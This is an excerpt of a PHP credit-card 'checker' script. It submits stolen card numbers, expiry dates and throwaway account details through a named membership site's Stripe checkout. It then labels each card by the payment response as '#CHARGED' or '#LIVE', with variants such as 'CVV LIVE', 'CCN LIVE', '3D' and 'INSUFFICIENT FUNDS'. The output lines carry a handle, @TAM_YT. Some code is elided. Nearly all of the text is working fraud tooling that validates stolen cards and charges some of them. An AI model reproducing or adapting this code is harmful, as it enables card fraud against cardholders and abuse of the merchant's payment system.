...
error_reporting(0);
//---------------------------------------//
$_site = "https://www.rebelsdiet.com/membership-account/membership-checkout/" ;
$amt = "49$" ;
//---------------------------------------//
...
curl_setopt($ch, CURLOPT_POSTFIELDS,'level=3&checkjavascript=1&other_discount_code=&username='.$firstname.'&password=johncarles2222&password2=johncarles2222&bemail= '.$email.'%40gmail.com&bconfirmemail= '.$email.'%40gmail.com&fullname=&CardType=mastercard&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX6416&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
...
elseif(strpos($result2, "succeeded")) {
    ...
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅  @TAM_YT </span><br>';
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ✅  @TAM_YT </span><br>';
    exit;
    }
...
elseif(strpos($result2, "incorrect_zip")) {
    ...
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅  @TAM_YT </span><br>';
    exit;
    }
...
elseif(strpos($result2, 'security code is incorrect.')) {
    ...
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅  @TAM_YT </span><br>';
    exit;
    }
...
elseif(strpos($result2, "stripe_3ds2_fingerprint")) {
    ...
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ✅  @TAM_YT </span><br>';
    exit;
    }
...
elseif(strpos($result2, '"cvc_check": "pass"')) {
    ...
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅  @TAM_YT </span><br>';
exit;
}

elseif(strpos($result2, "Membership Confirmation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: Membership Confirmation '.$amt.' ✅  TAMSTADE /span><br>';
exit;
}
...
elseif(strpos($result2, "incorrect_cvc")) {
    ...
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CCN LIVE ✅  @TAM_YT </span><br>';
exit;
}
